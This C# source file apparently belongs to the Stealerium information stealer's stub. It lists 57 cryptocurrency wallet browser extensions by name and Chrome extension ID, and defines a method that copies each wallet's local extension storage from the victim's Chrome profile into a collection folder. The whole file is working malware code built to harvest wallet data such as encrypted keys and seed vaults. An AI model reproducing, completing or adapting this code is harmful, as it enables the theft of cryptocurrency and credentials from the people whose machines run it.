using System.Collections.Generic;
using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers;

namespace Stealerium.Stub.Target.Browsers.Chromium
{
    internal class Extensions
    {
        // Dictionary for storing wallet names and corresponding Chrome extension IDs
        private static readonly Dictionary<string, string> ChromeWalletsDirectories = new Dictionary<string, string>
        {
            { "Chrome_Authenticator", "bhghoamapcdpbohphigoooaddinpkbai" },
            { "Chrome_Binance", "fhbohimaelbohpjbbldcngcnapndodjp" },
            { "Chrome_Bitapp", "fihkakfobkmkjojpchpfgcmhfjnmnfpi" },
            { "Chrome_BoltX", "aodkkagnadcbobfpggfnjeongemjbjca" },
            { "Chrome_Coin98", "aeachknmefphepccionboohckonoeemg" },
            { "Chrome_Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad" },
            { "Chrome_Core", "agoakfejjabomempkjlepdflaleeobhb" },
            { "Chrome_Crocobit", "pnlfjmlcjdjgkddecgincndfgegkecke" },
            { "Chrome_Equal", "blnieiiffboillknjnepogjhkgnoapac" },
            { "Chrome_Ever", "cgeeodpfagjceefieflmdfphplkenlfk" },
            { "Chrome_ExodusWeb3", "aholpfdialjgjfhomihkjbmgjidlcdno" },
            { "Chrome_Fewcha", "ebfidpplhabeedpnhjnobghokpiioolj" },
            { "Chrome_Finnie", "cjmkndjhnagcfbpiemnkdpomccnjblmj" },
            { "Chrome_Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln" },
            { "Chrome_Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj" },
            { "Chrome_HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib" },
            { "Chrome_Iconex", "flpiciilemghbmfalicajoolhkkenfel" },
            { "Chrome_JaxxLiberty", "cjelfplplebdjjenllpjcblmjkfcffne" },
            { "Chrome_Kaikas", "jblndlipeogpafnldhgmapagcccfchpi" },
            { "Chrome_KardiaChain", "pdadjkfkgcafgbceimcpbkalnfnepbnk" },
            { "Chrome_Keplr", "dmkamcknogkgcdfhhbddcghachkejeap" },
            { "Chrome_Liquality", "kpfopkelmapcoipemfendmdcghnegimn" },
            { "Chrome_MEWCX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm" },
            { "Chrome_MaiarDEFI", "dngmlblcodfobpdpecaadgfbcggfjfnm" },
            { "Chrome_Martian", "efbglgofoippbgcjepnhiblaibcnclgk" },
            { "Chrome_Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc" },
            { "Chrome_Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn" },
            { "Chrome_Metamask2", "ejbalbakoplchlghecdalmeeeajnimhm" },
            { "Chrome_Mobox", "fcckkdbjnoikooededlapcalpionmalo" },
            { "Chrome_Nami", "lpfcbjknijpeeillifnkikgncikgfhdo" },
            { "Chrome_Nifty", "jbdaocneiiinmjbjlgalhcelgbejmnid" },
            { "Chrome_Oxygen", "fhilaheimglignddkjgofkcbgekhenbh" },
            { "Chrome_PaliWallet", "mgffkfbidihjpoaomajlbgchddlicgpn" },
            { "Chrome_Petra", "ejjladinnckdgjemekebdpeokbikhfci" },
            { "Chrome_Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa" },
            { "Chrome_Pontem", "phkbamefinggmakgklpkljjmgibohnba" },
            { "Chrome_Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec" },
            { "Chrome_Safepal", "lgmpcpglpngdoalbgeoldeajfclnhafa" },
            { "Chrome_Saturn", "nkddgncdjgjfcddamfgcmfnlhccnimig" },
            { "Chrome_Slope", "pocmplpaccanhmnllbbkpgfliimjljgo" },
            { "Chrome_Solfare", "khacbfnclnjfjakompbldhceolaealdn" },
            { "Chrome_Sollet", "fhmfendgdocmcbmfikdcogofphimnkno" },
            { "Chrome_Starcoin", "mfhbebgoclkghebffdldpobeajmbecfk" },
            { "Chrome_Swash", "cmndjbecilbocjfkibfbifhngkdmjgog" },
            { "Chrome_TempleTezos", "ookjlbkiijinhpmnjffcofjonbfbgaoc" },
            { "Chrome_TerraStation", "aiifbnbfobpmeekipheeijimdpnlpgpp" },
            { "Chrome_Tokenpocket", "mfgccjchihfkkindfppnaooecgfneiii" },
            { "Chrome_Ton", "nphplpgoakhhjchkkhmiggakijnkhfnd" },
            { "Chrome_Tonkeeper", "ogaghekfbbibgpkeboogffmphcecpbga" },
            { "Chrome_Tron", "ibnejdfjmmkpcnlpebklmnkoeoihofec" },
            { "Chrome_TrustWallet", "egjidjbpglichdcondbcbdnbeeppgdph" },
            { "Chrome_Wombat", "amkmjjmmflddogmhpjloimipbofnfjih" },
            { "Chrome_XDEFI", "hmeobnfnfcmdkdcmlblgagmfpfboieaf" },
            { "Chrome_XMR.PT", "eigblbgjknlfbajkfhopmcojidlgcehm" },
            { "Chrome_XinPay", "bocpokimicclpaiekenaeelehdjllofo" },
            { "Chrome_Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb" },
            { "Chrome_iWallet", "kncchdigobghenbbaddojjnnaogfppfj" }
        };

        /// <summary>
        /// Retrieves Chrome wallets and saves them to the specified directory.
        /// </summary>
        /// <param name="saveDirectory">The directory where wallets will be saved.</param>
        public static void GetChromeWallets(string saveDirectory)
        {
            string baseBrowserPath = Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings");
            BrowserWalletExtensionsHelper.GetWallets(saveDirectory, ChromeWalletsDirectories, baseBrowserPath, "Chrome");
        }
    }
}
